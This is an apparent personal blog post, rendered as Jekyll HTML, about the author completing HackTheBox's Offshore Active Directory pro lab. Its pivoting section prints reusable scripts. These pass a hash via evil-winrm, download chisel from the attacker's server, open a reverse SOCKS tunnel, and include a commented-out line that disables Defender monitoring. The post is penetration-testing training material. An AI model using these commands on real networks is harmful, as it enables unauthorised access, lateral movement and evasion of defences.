@@ -1,0 +1,458 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.16.5 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Offshore - arty-hlr</title>
+<meta name="description" content="My journey through HTB’s Offshore Pro Lab!">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="arty-hlr">
+<meta property="og:title" content="Offshore">
+<meta property="og:url" content="http://localhost:4000/blog/2020/12/25/offshore/">
+
+
+  <meta property="og:description" content="My journey through HTB’s Offshore Pro Lab!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-12-25T00:00:00+01:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/blog/2020/12/25/offshore/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="arty-hlr Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          arty-hlr
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Offshore">
+    <meta itemprop="description" content="My journey through HTB’s Offshore Pro Lab!">
+    <meta itemprop="datePublished" content="December 25, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Offshore
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#intro">Intro</a></li>
+  <li><a href="#getting-up-to-speed-with-active-directory">Getting up to speed with Active Directory</a></li>
+  <li><a href="#week-1-baby-steps">Week 1: Baby steps</a></li>
+  <li><a href="#week-2-pivoting">Week 2: Pivoting…</a></li>
+  <li><a href="#week-3-ad-attacks-are-yummy">Week 3: AD Attacks are yummy</a></li>
+  <li><a href="#week-4-flag-hunt">Week 4: Flag hunt</a></li>
+  <li><a href="#review">Review</a></li>
+</ul>
+            </nav>
+          </aside>
+        
+        <h1 id="intro">Intro</h1>
+
+<p>December was gonna be another month of lockdown at home without much to do, so after a friend pwned it, and some nice troll from the InfoSec Prep discord started it, I decided to follow suit and to dedicate the month to <a href="https://www.hackthebox.eu/home/labs/pro/view/2">Offshore</a>! Unfortunately I was a bit impatient, bought the lab access on the 1st of December at midnight, turned out that they had a 50% discount from the 1st of December, which was rolled out during the day, so missed that 😅</p>
+
+<h1 id="getting-up-to-speed-with-active-directory">Getting up to speed with Active Directory</h1>
+
+<p>I had dedicated the last 2 weeks of November to get up to speed with Active Directory and the attacks on it, I used <a href="https://www.pentesteracademy.com/course?id=47">Attacking and Defending Directory</a> from PentesterAcademy (which is what comes bundled up with CRTP), the AD section of Heath Adam’s Practical Ethical Hacking Udemy <a href="https://www.udemy.com/course/practical-ethical-hacking/">course</a>, and various blog posts about specific attacks I found after googling around a bit. Overall it was very much needed, as my first and last interaction with AD was with the HTB Forest box, which I had done while it was active, but with way too many hints, and without understanding what I was doing. Putting words in my head behind how Kerberos works, what kerberoasting or asreproasting is, how to get golden/silver ticket, etc helped a lot understanding the basics.</p>
+
+<p>I even made my own little AD lab first on Azure, then at home, to follow along some attacks on Heath Adams’ course and to experiment a bit. Some resources for that <a href="https://csenox.github.io/active-directory/2020/10/07/AD-Lab/">here</a>, <a href="https://medium.com/@vartaisecurity/lab-building-guide-virtual-active-directory-5f0d0c8eb907">here</a>, <a href="https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">here</a>, <a href="https://medium.com/swlh/building-an-active-directory-lab-part-1a-automatedlab-fc2399ebe5be">here</a>, <a href="https://social.technet.microsoft.com/wiki/contents/articles/36438.windows-server-2016-build-a-windows-domain-lab-at-home-for-free.aspx">here</a>, and <a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">here</a>.</p>
+
+<p>I decided to take the opportunity to learn some new tools, so I set up <a href="https://obsidian.md/">Obsidian</a> for note taking, and <a href="https://github.com/cobbr/Covenant">Covenant</a> as a C2. Spoiler, I ended up using more often metasploit than covenant as a C2 haha! Also set up a <a href="https://github.com/fireeye/commando-vm">Commando VM</a> that could access my covenant server running on my Parrot machine, ended up doing everything from Parrot…</p>
+
+<h1 id="week-1-baby-steps">Week 1: Baby steps</h1>
+
+<p>Armed with my new found AD knowledge, I started Offshore… and didn’t see any AD attacks for a while 😅 There was some web attacks, a first pivot using SSH, some looking around making lots of noise (a blue teamer in charge of the offshore domains would have been able to run circles around me :P). But making friends along the way especially in the HTB discord server, we got together for some challenges, and I was at 25% at the end of my first week, on track to finish by Christmas!</p>
+
+<h1 id="week-2-pivoting">Week 2: Pivoting…</h1>
+
+<p>The first domain owned, started the pivoting game, and the AD attacks. It took me a few hours to find the best solutions for pivoting through the domains, using this <a href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/">post</a> which was very thorough in the many ways a red teamer can pivot through a network, and tired of having to type commands over and over, I decided to script my pivoting, and here’s the result: (spoiler free and re-usable)</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">pivot2.sh</code> to serve chisel64.exe, pipe the powershell script to evil-winrm, and set the proxychains config for this DC:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-ne</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s1">'-s[tart]/-r[un]'</span>
+    <span class="nb">exit
+</span><span class="k">fi
+
+</span><span class="nb">sudo sed</span> <span class="nt">-i</span> <span class="s1">'s/127\.0\.0\.1 108./127\.0\.0\.1 1080/'</span> /etc/proxychains.conf
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s1">'-s'</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s1">'[+] Serving on port 8000...'</span>
+    python3 <span class="nt">-m</span> http.server 8000 <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+    <span class="nb">cat </span>pivot2_s.ps1 | evil-winrm <span class="nt">-u</span> administrator <span class="nt">-H</span> YOUTHOUGHTYOUDSEEAHASHDIDNTYOU <span class="nt">-i</span> 172.16.X.X
+<span class="k">else
+    </span><span class="nb">cat </span>pivot2_r.ps1 | evil-winrm <span class="nt">-u</span> administrator <span class="nt">-H</span> YOUTHOUGHTYOUDSEEAHASHDIDNTYOU <span class="nt">-i</span> 172.16.X.X
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">pivot2_s.ps1</code> to upload and run the chisel client on the DC:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set-MpPreference -DisableRealtimeMonitoring $true</span><span class="w">
+</span><span class="nf">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">/appdata/local/temp</span><span class="w">
+</span><span class="nf">curl</span><span class="w"> </span><span class="nt">-outf</span><span class="w"> </span><span class="nx">chisel.exe</span><span class="w"> </span><span class="nx">http://10.10.14.XX:8000/chisel64.exe</span><span class="w">
+</span><span class="o">.</span><span class="nf">/chisel</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.XX:12345</span><span class="w"> </span><span class="nx">R:1080:socks</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">pivot2_r.ps1</code> to run the chisel client if it’s already uploaded:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set-MpPreference -DisableRealtimeMonitoring $true</span><span class="w">
+</span><span class="nf">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">/appdata/local/temp</span><span class="w">
+</span><span class="o">.</span><span class="nf">/chisel</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.XX:12345</span><span class="w"> </span><span class="nx">R:1080:socks</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">pivot3.sh</code> to kill the HTTP server, launch the chisel server, and change the proxychains config for the new pivot:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+ps <span class="nt">-aux</span> | <span class="nb">grep </span>http.server | <span class="nb">grep </span>8000 | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'\d+'</span> <span class="nt">-o</span> | <span class="nb">head</span> <span class="nt">-1</span> | xargs <span class="nb">kill </span>2&gt;&amp;1 <span class="o">&gt;</span> /dev/null
+<span class="nb">sudo sed</span> <span class="nt">-i</span> <span class="s1">'s/127\.0\.0\.1 108./127\.0\.0\.1 1081/'</span> /etc/proxychains.conf
+chisel server <span class="nt">-p</span> 12345 <span class="nt">-reverse</span>
+</code></pre></div></div>
+
+<p>You’re welcome to steal those short scripts and adapt them for your pivoting needs! As I would get to know, I’d need a few of those to pivot through all the domains, in total 4 pivots!</p>
+
+<h1 id="week-3-ad-attacks-are-yummy">Week 3: AD Attacks are yummy</h1>
+
+<p>Cross domain and cross forest attacks were kinda new to me but I had a blast learning them! Also, ACLs can hide many juicy things :P Bloodhound was a lot of help in finding out how to abuse some ACLs and trusts, I wish I had used <a href="https://exploit.ph/powerview.html">PowerView</a> more though and enumerated some stuff manually, would have prevented a lot of VM lagging and crashes because well I had obsidian, covenant, discord, and bloodhound running at the same time… But still learned a lot along the way, and the 3rd week was the 3rd quarter syndrome a bit, seeing how much work I had done, and seeing I had about the same amount still to do, and Christmas approaches…</p>
+
+<h1 id="week-4-flag-hunt">Week 4: Flag hunt</h1>
+
+<p>Total domain pwnage! I had owned all offshore domains… and was still missing a few flags. So on the enumeration hunt I went, trying to find some hidden flags, and turns out one of those was actually from a challenge that had been removed! Thanks to Ippsec for the help taking care of that!</p>
+
+<p>24th of December, 3 PM, all domain flags in the pocket, getting ready for Christmas cooking… and still lacking one linux machine! This one turned up to be a bit of a closed beast, but was a very nice programming challenge, and I enjoyed writing the script to get the privesc on it, but that was on the 25th. So in the end Offshore completed, just on Christmas day :D And a nice certificate as a gift!</p>
+
+<p><img src="http://localhost:4000/assets/images/offshore-certificate.png" alt="Offshore Certificate" /></p>
+
+<h1 id="review">Review</h1>
+
+<p>Overall I learned during my Offshore journey, some challenges were frustrating, some required a bit of help, I won’t hide it, I made good friends along the way, and I’m very happy I could finish it under a month. I would recommend Offshore to all pentesters/hackers who want some more hands-on experience with AD attacks, and pivoting through networks, and who are not shy of googling stuff until it works. Very long but very good experience, looking forward to doing more AD related stuff in the future!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-12-25T00:00:00+01:00">December 25, 2020</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Offshore%20http%3A%2F%2Flocalhost%3A4000%2Fblog%2F2020%2F12%2F25%2Foffshore%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fblog%2F2020%2F12%2F25%2Foffshore%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fblog%2F2020%2F12%2F25%2Foffshore%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/2020/12/15/ecxd/" class="pagination--pager" title="eLearnSecurity Certified eXploit Developer
+">Previous</a>
+    
+    
+      <a href="/2021/02/01/ewptx.html" class="pagination--pager" title="Ewptx
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/2021/02/24/blue-team.html" rel="permalink">Blue Team
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/2021/02/15/crte.html" rel="permalink">Crte
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/2021/02/01/ewptx.html" rel="permalink">Ewptx
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/blog/2020/12/15/ecxd/" rel="permalink">eLearnSecurity Certified eXploit Developer
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">A review of the XDS course/eCXD exam by eLS
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 arty-hlr. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
